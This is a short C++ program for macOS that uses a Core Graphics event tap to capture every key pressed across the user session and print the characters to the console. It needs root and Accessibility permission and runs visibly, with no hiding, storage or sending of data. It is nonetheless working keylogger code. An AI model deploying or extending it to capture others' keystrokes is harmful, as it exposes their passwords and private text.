#include <mach/mach.h>
#include <iostream>
#include <unordered_map>
#include <ApplicationServices/ApplicationServices.h>
#include <utility>
#include <unistd.h>

// Keycode to character mapping
const std::unordered_map<CGKeyCode, std::pair<std::string, std::string> > keyMap = {
    {0, {"A", "a"}}, {1, {"S", "s"}}, {2, {"D", "d"}}, {3, {"F", "f"}},
    {4, {"H", "h"}}, {5, {"G", "g"}}, {6, {"Z", "z"}}, {7, {"X", "x"}},
    {8, {"C", "c"}}, {9, {"V", "v"}}, {12, {"Q", "q"}}, {13, {"W", "w"}},
    {14, {"E", "e"}}, {15, {"R", "r"}}, {16, {"Y", "y"}}, {17, {"T", "t"}},
    {18, {"1", "1"}}, {19, {"2", "2"}}, {20, {"3", "3"}}, {21, {"4", "4"}},
    {22, {"6", "6"}}, {23, {"5", "5"}}, {24, {"=", "="}}, {25, {"9", "9"}},
    {26, {"7", "7"}}, {27, {"-", "-"}}, {28, {"8", "8"}}, {29, {"0", "0"}},
    {30, {"]", "]"}}, {31, {"O", "o"}}, {32, {"U", "u"}}, {33, {"[", "["}},
    {34, {"I", "i"}}, {35, {"P", "p"}}, {36, {"Return", "Return"}}, {37, {"L", "l"}},
    {38, {"J", "j"}}, {39, {"'", "'"}}, {40, {"K", "k"}}, {41, {";", ";"}},
    {42, {"\\", "\\"}}, {43, {",", ","}}, {44, {"/", "/"}}, {45, {"N", "n"}},
    {46, {"M", "m"}}, {47, {".", "."}}, {49, {"Space", "Space"}}, {50, {"`", "`"}},
    {51, {"Delete", "Delete"}}, {53, {"Escape", "Escape"}}
};


// Callback function for keyboard events
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        bool isShiftPressed = (CGEventGetFlags(event) & kCGEventFlagMaskShift) != 0;
        auto it = keyMap.find(keycode);
            if (it != keyMap.end()) {
                const auto &keyPair = it->second;
                std::string keyOutput = isShiftPressed ? keyPair.first : keyPair.second;

                if (keyOutput == "Space") {
                    std::cout << " " << std::flush;
                } else {
                    std::cout << keyOutput << std::flush;
                }
            } else {
                std::cout << "[Unknown Key: " << keycode << "] " << std::flush;
            }
        }
    return event;
}

int main() {
    // Check if running with sudo
    if (geteuid() != 0) {
        std::cerr << "Error: Run this program with sudo.\n";
        return -1;
    }

    // Try creating an event tap
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        eventMask,
        eventCallback,
        nullptr);

    if (!eventTap) {
        std::cerr << "Error: Could not create event tap. Accessibility permissions are required.\n";
        return -1;
    }

    // Enable the event tap
    CGEventTapEnable(eventTap, true);

    if (!CGEventTapIsEnabled(eventTap)) {
        std::cerr << "Error: Event tap is not enabled. SIP or Accessibility permissions might block this.\n";
        CFRelease(eventTap);
        return -1;
    }

    // Run the event loop
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    std::cout << "Listening for key events... Press Ctrl+C to exit.\n";
    CFRunLoopRun();

    // Cleanup
    CFRelease(eventTap);
    CFRelease(runLoopSource);

    return 0;
}
